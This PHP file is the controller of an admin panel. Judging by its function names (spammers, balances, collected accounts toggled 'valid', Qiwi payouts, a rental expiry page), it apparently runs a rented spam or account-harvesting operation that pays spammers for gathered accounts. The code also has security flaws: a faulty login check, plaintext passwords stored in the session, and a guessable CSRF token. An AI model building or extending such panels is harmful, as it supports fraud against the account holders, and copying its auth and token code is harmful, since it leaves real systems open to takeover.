<?php
	require_once("../php/classPanel.php");
	require_once("../php/classPanelPageGenerator.php");
	
	session_start();
	
	$url_array = parse_url($_SERVER['REQUEST_URI']);
	$path = $url_array["path"];
	if ($path[strlen($path)-1] == "/") $path = substr($path, 0, -1); 
	
	$Panel = new classPanel();
	
	
	
	if (
	
		($path !== "/apanel/auth") 
		
			&& 
			
		!isset($_POST["auth"])
		
			&&
		
		(
			!isset($_SESSION["admin_login"]) 
				&& 
			!isset($_SESSION["admin_password"])
		) 
		
			&& 
		
		!$Panel->b_checkAdmin(
			$_SESSION["admin_login"], 
			$_SESSION["admin_password"]
		)
		
	) {
		header("Location: /apanel/auth");
		exit();
	}
	
	
	
	if(!empty($_POST))
	{
		if (isset($_POST["auth"])) 
		{
			if ($Panel->b_checkAdmin($_POST["email"], $_POST["password"])) 
			{
				$_SESSION["admin_login"] = $_POST["email"];
				$_SESSION["admin_password"] = $_POST["password"];
				$_SESSION["csrf_token"] = md5("zldufhbl" + rand());
				header("Location: /apanel");
			}
			else header("Location: /apanel/auth");
				
			exit();
		}
		
		
		if (isset($_POST["do"])) 
		{
			if ($_POST["csrf_token"] == $_SESSION["csrf_token"]) 
			{
				if (isset($_POST["settings"])) $Panel->void_UpdateSettings($_POST);
				
				if ($_POST["do"] == "SetBalance") {
					$spammer = $Panel->arr_GetSpammerById($_POST["id"]);
					$Panel->void_UpdateSpammer($spammer["login"], null, null, $_POST["balance"]);
					exit();
				}
				
				if ($_POST["do"] == "SetPassword") {
					$Panel->void_SetPassword($_POST["id"], $_POST["pass"]);
					exit();
				}
				
				if ($_POST["do"] == "SetKT") {
					$Panel->void_SetKT($_POST["id"], $_POST["kt"]);
					exit();
				}
				
				if ($_POST["do"] == "DelAll") {
					$Panel->void_TruncAccs();
					exit();
				}
				
				if ($_POST["do"] == "Delete") {
					$Panel->void_dropAccount($_POST["id"]);
					exit();
				}
				
				if ($_POST["do"] == "ResetVisits") {
					$Panel->void_resetVisits();
					exit();
				}
				
				if ($_POST["do"] == "ToggleValid") {
					$Panel->void_ToggleValid($_POST["id"]);
					exit();
				}
				
				if ($_POST["do"] == "DelSpamer") {
					$Panel->void_dropSpammer($_POST["id"]);
					exit();
				}
				
				if ($_POST["do"] == "PayOut") {
					$Panel->void_PayoutOnQiwi($_POST["login"], $_POST["comment"]);
					exit();
				}
				
				if ($_POST["do"] == "DenyPayout") {
					$Panel->void_DenyPayout($_POST["id"]);
					exit();
				}
				
			}
		}
	}
	
	
	
	$id = "";
	$part = false;
	
	
	if (!empty($_GET))
	{
		
		if (array_key_exists("do", $_GET)) 
		{
			if ($_GET["do"] == "GetCount") 
			{
				echo $count = $Panel->int_CountAccounts();
			//	echo '{"count":'. $count .'}';
				exit();
			}
			
			if ($_GET["do"] == "GetPart") {
				$id = $_GET["id"];
				$part = true;
			}
			
			if ($_GET["do"] == "GetTextView") {
				echo $Panel->s_TextView();
				exit();
			}
		}
		
	}
	
	
	
	$PanelPageGen = new PageGenerator("template", $part, $id);
	
	if ($Panel->int_GetTimerActivity() > 0) {
		if ($Panel->int_GetTimerTime() <= time()) {
			echo $PanelPageGen->GenerateRentIsOver();
			exit();
		} 
	}
	
	
	switch ($path){
		case "/apanel/auth": 
			if ($Panel->b_checkAdmin($_SESSION["spammer_login"], $_SESSION["spammer_password"])) {
				header("Location: /apanel");
				exit();
			};
			echo $PanelPageGen->GenerateAuth();
		break;
		
		case "/apanel/logout": 
			unset($_SESSION["admin_login"]);
			unset($_SESSION["admin_password"]);
			header("Location: /apanel/auth");
			exit();
		break;
		
		case "/apanel": 
			echo $PanelPageGen->GenerateIndex();
		break;
		
		case "/apanel/spammers": 
			echo $PanelPageGen->GenerateSpammers();
		break;
		
		case "/apanel/payouts": 
			echo $PanelPageGen->GeneratePayouts();
		break;
		
		case "/apanel/settings":
			echo $PanelPageGen->GenerateSettings();
		break;
		
	}
?>